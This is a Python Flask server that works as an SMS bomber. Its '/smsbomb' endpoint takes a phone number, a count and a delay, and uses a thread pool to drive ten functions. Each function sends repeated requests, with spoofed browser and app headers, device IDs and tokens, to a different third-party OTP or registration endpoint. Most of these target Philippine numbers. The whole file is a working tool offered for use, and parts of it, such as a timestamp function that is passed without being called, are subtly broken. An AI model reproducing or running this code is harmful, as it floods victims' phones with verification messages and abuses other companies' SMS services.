from flask import Flask, request, jsonify
import time
import sys
from threading import Thread
import base64
import requests
import json
from multiprocessing.pool import ThreadPool
import random

limit = 0
limit1 = 0
field = 0
slp = 0
app = Flask(__name__)

session = requests.Session()


def otp(number):
    global limit, field
    if str(number[0]) == "0":
        number = number.replace(str(number[0]), "63")
    elif str(number[0]) == "+":
        number = number.replace("+", "")
    else:
        pass
    url = "https://admin.sunoro7778.site:443/api/sms/sendCode"
    header = {
        'Host': 'admin.sunoro7778.site',
        'Connection': 'keep-alive',
        'Content-Length': '352',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'http://8.219.139.46',
        'X-Requested-With': 'com.BlackRvip.blackrock',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'http://8.219.139.46/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {
        "mobile": str(number),
        "type": 4,
        "token": "null",
        "language": "en_us"
    }
    try:
        web = requests.post(url, headers=header, json=body)
        r = json.loads(web.text)
        if r["code"] == 1:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def otp1(number):
    global limit, field
    if str(number[0]) == "0":
        number = number.replace(str(number[0]), "63")
    elif str(number[0]) == "+":
        number = number.replace("+", "")
    else:
        pass
    url = "https://admin.sunoro7778.site:443/api/sms/sendCode"
    header = {
        'Host': 'admin.sunoro7778.site',
        'Connection': 'keep-alive',
        'Content-Length': '66',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'http://8.219.139.46',
        'X-Requested-With': 'com.BlackRvip.blackrock',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'http://8.219.139.46/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {
        "mobile": str(number),
        "type": 1,
        "token": "null",
        "language": "en_us"
    }
    try:
        web = requests.post(url, headers=header, json=body)
        r = json.loads(web.text)
        if r["code"] == 1:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def otp2(number):
    global limit, field
    if str(number[0]) == "0":
        number = str(number[1:])
    elif str(number[0]) == "+":
        number = str(number[3:])
    elif str(number[:2]) == "63":
        number = str(number[:2])
    else:
        pass

    def bencoder(string):
        string = covert_to_string(string)
        string = string.encode("ascii")
        data = base64.b64encode(string)
        data = data.decode("ascii")
        return data

    def covert_to_string(string):
        string = str(string)
        string = string.replace('\'', '"')
        string = string.replace(" ", '')
        return string

    def get_timestamp():
        url = "http://login.ma7hrte3s4d5r6t.com:80/info"
        header = {
            'Host': 'login.ma7hrte3s4d5r6t.com',
            'User-Agent':
            'UnityPlayer/2019.2.11f1 (UnityWebRequest/1.0, libcurl/7.52.0-DEV)',
            'Accept': '*/*',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Unity-Version': '2019.2.11f1',
            'Content-Length': '96'
        }
        body = {
            "content":
            "eyJ0eXBlIjoxLCJsdWFWZXIiOiIxMDY0MyIsInJlc1ZlciI6IjEwNjQyIiwiYXBwVmVyIjoiMS4wLjAifQ=="
        }
        web = requests.post(url, headers=header, data=body)
        page = json.loads(web.text)
        return page["svrTime"]

    url = "http://login.ma7hrte3s4d5r6t.com:80/verifyCode"
    header = {
        'Host': 'login.ma7hrte3s4d5r6t.com',
        'User-Agent':
        'UnityPlayer/2019.2.11f1 (UnityWebRequest/1.0, libcurl/7.52.0-DEV)',
        'Accept': '*/*',
        'Accept-Encoding': 'deflate, gzip',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Unity-Version': '2019.2.11f1',
        'Content-Length': '228'
    }
    str_body = {
        "timestamp": str(get_timestamp),
        "phoneArea": "063",
        "token": "074075569cc8ba75714fbbe39bf89590",
        "type": 1,
        "deviceCode": "beeffdbe2c54e77829192d7ec31f5b4e",
        "phone": str(number)
    }
    encrypt_body = bencoder(str(str_body))
    body = {"content": str(encrypt_body)}
    try:
        web = requests.post(url, headers=header, data=body)
        r = json.loads(web.text)
        if r["code"] == 0:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def otp3(number):
    global limit, field
    if str(number[0]) == "0":
        number = "+63" + str(number[1:])
    elif str(number[:2]) == "63":
        number = "+" + str(number)
    else:
        pass
    url = "https://graphql.toktok.ph:2096/auth/graphql/"
    header = {
        'accept': '*/*',
        'authorization': '',
        'Content-Type': 'application/json',
        'Content-Length': '199',
        'Host': 'graphql.toktok.ph:2096',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.9.1'
    }
    body = {
        "operationName":
        "loginRegister",
        "variables": {
            "input": {
                "mobile": str(number),
                "appFlavor": "C"
            }
        },
        "query":
        "mutation loginRegister($input: LoginRegisterInput!) {\nloginRegister(input: $input)\n}\n"
    }
    try:
        web = requests.post(url, headers=header, json=body)
        r = json.loads(web.text)
        if r["data"]["loginRegister"] == "REGISTER":
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def otp4(number):
    global limit, field
    if str(number[0]) == "+":
        number = "0" + str(number[1:])
    elif str(number[:2]) == "63":
        number = "0" + str(number[2:])
    else:
        pass
    url = "http://8.212.181.240:80/index/user/send_code"
    header = {
        'Device-Id': '3076685aef999931',
        'App-Id': 'UYJEeAtD',
        'Authorization': '',
        'Content-Type': 'application/json; charset=UTF-8',
        'Content-Length': '23',
        'Host': '8.212.181.240',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.9.0'
    }
    body = {"phone": str(number)}
    try:
        web = requests.post(url, headers=header, json=body)
        r = json.loads(web.text)
        if r["msg"] == "success":
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def otp5(number):
    global limit, field
    if str(number[0]) == "0":
        number = number.replace(str(number[0]), "63")
    elif str(number[0]) == "+":
        number = number.replace("+", "")
    else:
        pass
    url = "https://api.777pub.app:443/account/get_code"
    header = {
        'Host': 'api.777pub.app',
        'Connection': 'keep-alive',
        'Content-Length': '83',
        'User-Agent':
        'Mozilla/5.0 (Linux; U; Android 12; zh-cn; 2109119BC Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.8.58 swan-mibrowser',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://www.777pub.com',
        'X-Requested-With': 'com.happythree.sevengames.pubshow',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.777pub.com/?f=UIHall',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {
        'token': 'MTY3MTY2NTM2NH61idmEdMlptKqwbQ',
        'tel': str(number),
        'type': 0,
        'area': '63',
        'language': 'en-us'
    }
    try:
        web = requests.post(url, headers=header, data=body)
        r = json.loads(web.text)
        if r["code"] == 0:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def otp6(number):
    global limit, field
    if str(number[0]) == "0":
        number = str(number[1:])
    elif str(number[0]) == "+":
        number = str(number[3:])
    elif str(number[:2]) == "63":
        number = str(number[2:])
    else:
        pass
    url = "https://www.qmsyrr.com/index/Index/smsCode.html"
    header = {
        'Host': 'www.qmsyrr.com',
        'Connection': 'keep-alive',
        'Content-Length': '17',
        'sec-ch-ua':
        '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46',
        'sec-ch-ua-platform': '"Windows"',
        'sec-gpc': '1',
        'Origin': 'https://www.qmsyrr.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer':
        'https://www.qmsyrr.com/index/index/login.html?code=4927714',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {"mobile": str(number)}
    try:
        web = requests.post(url, headers=header, data=body)
        if int(web.status_code) == 200:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def otp8(number):
    global limit, field
    if str(number[0]) == "0":
        number = str(number[1:])
    elif str(number[0]) == "+":
        number = str(number[3:])
    elif str(number[:2]) == "63":
        number = str(number[2:])
    else:
        pass
    session = requests.Session()
    url = "https://api.ayala-group.top/sendSMS.do"
    header = {
        'Host': 'api.ayala-group.top',
        'Connection': 'keep-alive',
        'Content-Length': '24',
        'sec-ch-ua':
        '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'sec-ch-ua-mobile': '?0',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
        'sec-ch-ua-platform': '"Windows"',
        'sec-gpc': '1',
        'Origin': 'https://m.ayala-vip.com/',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://m.ayala-vip.com/',
        'Accept-Encoding': 'gzip',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {"mobile": str(number), "type": "2"}
    try:
        web = session.post(url, headers=header, data=body)
        if int(web.status_code) == 200:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def otp9(number):
    global limit, field
    if str(number[0]) == "0":
        number = str(number[1:])
    elif str(number[0]) == "+":
        number = str(number[3:])
    elif str(number[:2]) == "63":
        number = str(number[2:])
    else:
        pass
    session = requests.Session()
    url = "https://api.ayala-group.top/sendSMS.do"
    header = {
        'Host': 'api.ayala-group.top',
        'Connection': 'keep-alive',
        'Content-Length': '24',
        'sec-ch-ua':
        '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'sec-ch-ua-mobile': '?0',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
        'sec-ch-ua-platform': '"Windows"',
        'sec-gpc': '1',
        'Origin': 'https://m.ayala-vip.com/',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://m.ayala-vip.com/',
        'Accept-Encoding': 'gzip',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {"mobile": str(number), "type": "3"}
    try:
        web = session.post(url, headers=header, data=body)
        if int(web.status_code) == 200:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def otp10(number):
    global limit, field
    if str(number[0]) == "0":
        number = str(number[1:])
    elif str(number[0]) == "+":
        number = str(number[3:])
    elif str(number[:2]) == "63":
        number = str(number[2:])
    else:
        pass
    session = requests.Session()
    url = "https://api.yhaphtai.com/home/login/register_code"
    body = {"phone": str(number), "captcha": ""}
    try:
        web = session.post(url, json=body)
        if int(web.status_code) == 200:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def bomber(function, number, limit1, slp):
    global RUN
    RUN = True
    while RUN:
        if function(number):
            if int(limit) >= int(limit1):
                RUN = False
            time.sleep(int(slp))

@app.route('/', methods=['GET'])
def nice():
   return jsonify({'message': 'Hi'})

@app.route('/smsbomb', methods=['GET'])
def sms_bomb():
    global limit1, slp
    number = request.args.get('number')
    amount = request.args.get('amount', type=int)
    slp = request.args.get('sleep', type=int)

    if not number:
        return jsonify({'error': 'Number is required'}), 400

    function = [
        otp, otp1, otp2, otp3, otp4, otp5, otp6,  otp8, otp9, otp10
    ]
    limit1 = amount

    p = ThreadPool(len(function))
    p.starmap(bomber, [(f, number, limit1, slp) for f in function])

    return jsonify({'message': 'Bombing started!'})
     
def run():
    app.run(host='0.0.0.0', port=7210)

if __name__ == '__main__':
    t = Thread(target=run)
    t.start()
